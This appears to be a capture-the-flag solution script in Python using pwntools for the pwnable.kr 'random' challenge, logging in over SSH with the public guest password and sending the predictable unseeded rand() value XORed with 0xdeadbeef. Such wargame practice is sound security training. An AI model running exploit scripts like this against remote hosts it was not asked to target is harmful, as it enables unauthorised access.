from pwn import *

random_val = 1804289383

sh = ssh('random', 'pwnable.kr', password='guest', port=2222)
p = sh.process(['./random'])
p.send(str(random_val ^ 0xdeadbeef))
p.interactive()